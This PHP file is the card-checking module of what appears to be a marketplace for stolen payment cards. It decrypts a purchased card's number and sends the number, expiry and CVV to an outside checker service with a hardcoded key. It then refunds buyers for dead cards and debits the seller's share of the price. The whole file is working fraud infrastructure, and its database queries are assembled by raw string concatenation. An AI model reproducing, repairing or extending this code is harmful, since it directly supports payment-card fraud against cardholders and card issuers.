<?php
set_time_limit(0);
session_start();

//require "./includes/config.inc.php";
//include_once './21232f297a57a5a743894a0e4a801fc3/header.php';

if (checkLogin(PER_USER)) {
    if ($_GET["card_id"] != "") {
        $card_id = $db->escape($_GET["card_id"]);
        $sql = "SELECT *, AES_DECRYPT(card_number, '" . strval(DB_ENCRYPT_PASS) . "') AS card_number FROM `" . TABLE_CARDS . "` WHERE card_id = '" . $card_id . "' AND card_check = '" . strval(CHECK_DEFAULT) . "'";
        $records = $db->fetch_all_array($sql);
        if (count($records) > 0) {
            $value = $records[0];
            if($value["card_refund"] == '1'){
            if ($value["card_userid"] == $_SESSION["user_id"]) {
                if (intval($value["card_buyTime"]) + intval($db_config["check_timeout"]) >= time()) {
                    $sql = "SELECT * FROM `".TABLE_USERS."` WHERE user_id = '".$_SESSION["user_id"]."'";
	                $user_info = $db->query_first($sql);
                    $user_balance = $user_info["user_balance"];

                    if (true) {
                        if (doubleval($user_balance) >= doubleval($db_config["check_fee"])) {
                            $check_add["check_userid"] = $_SESSION["user_id"];
                            $check_add["check_cardid"] = $card_id;
                            $check_add["check_time"] = time();
                            $check = check_for_image($value["card_number"], $value["card_month"],$value["card_year"], $value["card_cvv"]);
							
                            if ($check == 1) {
                                $credit_update["user_balance"] = doubleval($user_balance) - doubleval($db_config["check_fee"]);
                                $check_add["check_fee"] = $db_config["check_fee"];
                                $check_add["check_result"] = strval(CHECK_VALID);
                                $check_update["card_check"] = strval(CHECK_VALID);
                                $respond = "<span class=\"green bold\">VALID</span>";
                            } elseif ($check == 0) {
                                $credit_update["user_balance"] = doubleval($user_balance) + doubleval($value["card_price"]);
                                $check_add["check_fee"] = $db_config["check_fee"];
                                $check_add["check_result"] = strval(CHECK_REFUND);
                                $check_update["card_check"] = strval(CHECK_REFUND);
                                $respond = "<span class=\"pink bold\">INVALID - REFUNDED</span>";
                                
                            $temp_card = mysqli_query($conn, "SELECT * FROM `cards` WHERE `card_id`='$card_id';");
                            $row = mysqli_fetch_array($temp_card);
                            $seller = $row['seller'];
                            $price = round(floatval(($row['card_price'] * 75) / 100),2);
                            
            				$sql = "UPDATE `users` SET seller_balance = seller_balance - '$price' WHERE `user_id`='$seller';";
            		        $result = mysqli_query($conn, $sql);
                            }
                        } else {
                            $respond = "<span class=\"red bold\">You must have $" . number_format($db_config["check_fee"], 2, '.', '') . " to check card</span>";
                        }
                    } else {
                        $credit_update["user_balance"] = doubleval($user_balance) + doubleval($value["card_price"]);
                        $check_add["check_fee"] = $db_config["check_fee"];
                        $check_add["check_result"] = strval(CHECK_REFUND);
                        $check_update["card_check"] = strval(CHECK_REFUND);
                        $respond = "<span class=\"pink bold\">INVALID - REFUNDED</span>";
                        
                    	$temp_card = mysqli_query($conn, "SELECT * FROM `cards` WHERE `card_id`='$card_id';");
                        $row = mysqli_fetch_array($temp_card);
                        $seller = $row['seller'];
                        $price = round(floatval(($row['card_price'] * 75) / 100),2);
                        
        				$sql = "UPDATE `users` SET user_balance= user_balance - '$price' WHERE `user_id`='$seller';";
        		        $result = mysqli_query($conn, $sql);
                    }
                } else {
                    $check_add["check_result"] = strval(CHECK_INVALID);
                    $check_update["card_check"] = strval(CHECK_INVALID);
                    $respond = "<span class=\"red bold\">TIMEOUT</span>";
                }
            } else {
                $respond = "<span class=\"red bold\">This card doesn't belong to you</span>";
            }
            if (count($check_update) > 0) {
                if (!$db->query_update(TABLE_CARDS, $check_update, "card_id='" . $card_id . "'")) {
                    $respond = "<span class=\"red bold\">Update card check error, please try again</span>";
                }
            }
            if (count($check_add) > 0) {
                if (!$db->query_insert(TABLE_CHECKS, $check_add)) {
                    $respond = "<span class=\"red bold\">Insert check information error, please try again</span>";
                }
            }
            if (count($credit_update) > 0) {
                if ($db->query_update(TABLE_USERS, $credit_update, "user_id='" . $_SESSION["user_id"] . "'")) {
                    $user_info["user_balance"] = $credit_update["user_balance"];
                } else {
                    $respond = "<span class=\"red bold\">Update credit error, please try again</span>";
                }
            }
            
                }else {
    				$check_add["check_fee"] = $db_config["check_fee"];
					$check_add["check_result"] = strval(CHECK_VALID);
					$check_update["card_check"] = strval(CHECK_VALID);
					$respond = "<span class=\"green bold\">UNREFUNDABLE</span>";
        		}
        } else {
            $respond = "<span class=\"red bold\">This card doesn't exist</span>";
        }
        echo $respond;
    }
} else {
    header("Location: login.php");
}

function check_for_image($card_number, $card_month, $card_year, $card_cvv) {
    $curl = curl_init();
	//$url = 'https://bestisben.xyz/place/api/request/image';\
	$card_year =  substr($card_year, -2);
	if(strlen($card_month) ==1){
		$card_month = "0".$card_month;
	}
	$url = "https://luxchecker.pw/apiv2/ck.php?cardnum=".$card_number."&expm=".$card_month."&expy=".$card_year."&cvv=".$card_cvv."&amount=5&key=f880ac907738712a758bcf53ba06be7c&username=MajorShop";
	
	  curl_setopt_array($curl, array(
	  CURLOPT_URL => $url,
	  CURLOPT_RETURNTRANSFER => true,
	  CURLOPT_ENCODING => "",
	  CURLOPT_MAXREDIRS => 10,
	  CURLOPT_TIMEOUT => 30,
	  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
	  CURLOPT_CUSTOMREQUEST => "GET",
	  CURLOPT_HTTPHEADER => array(
		"cache-control: no-cache",
		"postman-token: 949f1edd-aa49-a0d8-34e9-fe26d42d6145"
	  ),
	));

	$response = curl_exec($curl);
	$err = curl_error($curl);

	curl_close($curl);
	
	$res = json_decode($response, true);
	
	return (int)$res['result'];

   
}
exit(0);
